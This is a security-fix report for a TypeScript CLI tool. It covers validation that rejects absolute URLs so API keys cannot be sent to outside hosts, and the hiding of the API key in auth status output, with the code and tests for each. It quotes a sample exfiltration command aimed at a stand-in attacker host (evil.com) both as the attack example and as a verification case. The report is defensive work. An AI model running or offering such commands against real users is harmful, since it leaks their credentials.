# Security Fixes Complete

## Date: 2026-02-07

## Critical Security Issues Fixed

### Issue 1: SSRF via abs api command (CRITICAL) - FIXED

**Severity:** CRITICAL
**Location:** `src/lib/api/client.ts` line 659-672

**Problem:**
User could provide absolute URL as path, causing API key to be sent to external server.

**Attack Example:**
```bash
abs api https://evil.com/steal --method POST
# Would send: Authorization: Api-Key YOUR_ACTUAL_KEY to evil.com
```

**Fix Applied:**
Added validation in `rawRequest()` method to reject absolute URLs and enforce relative paths:

```typescript
async rawRequest(path: string, method = 'GET', data?: unknown, headers?: Record<string, string>) {
  // Validate path is relative and not an absolute URL
  if (path.includes('://')) {
    throw new Error(
      'Invalid API path: Absolute URLs are not allowed.\n' +
      'Paths must be relative to the API endpoint (e.g., /experiments, /goals).'
    );
  }

  if (!path.startsWith('/')) {
    throw new Error(
      'Invalid API path: Must start with "/" (e.g., /experiments, not experiments).'
    );
  }
  // ... rest of implementation
}
```

**Tests Added:**
- Rejects `https://` URLs
- Rejects `http://` URLs
- Rejects `file://` URLs
- Rejects paths without leading slash
- Accepts valid relative paths like `/experiments`

**Test Results:** All SSRF protection tests pass ✓

---

### Issue 2: API Key Exposure in auth status (MEDIUM-HIGH) - FIXED

**Severity:** MEDIUM-HIGH
**Location:** `src/commands/auth/index.ts` line 52

**Problem:**
Last 4 characters of API key shown in output by default, could be captured in logs, screenshots, or terminal recordings.

**Fix Applied:**
Made API key display opt-in with `--show-key` flag:

```typescript
statusCommand
  .option('--show-key', 'show last 4 characters of API key')
  .action(withErrorHandling(async (options) => {
    const apiKey = await getAPIKey(profileName);

    const keyDisplay = apiKey
      ? (options.showKey ? '***' + apiKey.slice(-4) : '***hidden***')
      : 'not set';

    console.log(`API Key: ${keyDisplay}`);
  }));
```

**Behavior:**
- Default: `API Key: ***hidden***`
- With `--show-key`: `API Key: ***cdef`
- No key: `API Key: not set`

**Tests Added:**
- Verifies key is hidden by default
- Verifies key shows last 4 chars with `--show-key`
- Verifies "not set" message when no key exists

**Test Results:** All API key display tests pass ✓

---

## Test Coverage

### Files Modified:
1. `/Users/joalves/git_tree/absmartly-cli-ts/src/lib/api/client.ts`
2. `/Users/joalves/git_tree/absmartly-cli-ts/src/commands/auth/index.ts`

### Test Files Created/Modified:
1. `/Users/joalves/git_tree/absmartly-cli-ts/src/lib/api/client.test.ts` - Added 5 security tests
2. `/Users/joalves/git_tree/absmartly-cli-ts/src/commands/auth/auth.test.ts` - Created 3 security tests

### Test Results:
```
✓ SSRF Protection Tests (5/5)
  - Rejects https:// URLs
  - Rejects http:// URLs
  - Rejects file:// URLs
  - Rejects paths without leading slash
  - Accepts valid relative paths

✓ API Key Display Tests (3/3)
  - Hides key by default
  - Shows last 4 with --show-key flag
  - Shows "not set" when no key
```

---

## Security Impact

### Before:
- **SSRF Attack Vector:** API keys could be stolen by tricking users to run `abs api https://evil.com`
- **Key Leakage:** Last 4 characters always visible in logs/screenshots

### After:
- **SSRF Protected:** Absolute URLs rejected with clear error message
- **Key Hidden:** API key fully hidden by default, opt-in to show last 4 chars

---

## Verification Commands

Test SSRF protection:
```bash
# Should fail with error
abs api https://evil.com/steal

# Should work
abs api /experiments --method GET
```

Test API key hiding:
```bash
# Hidden by default
abs auth status

# Show last 4 chars
abs auth status --show-key
```

---

## Status: COMPLETE ✓

All critical security issues have been fixed and tested.
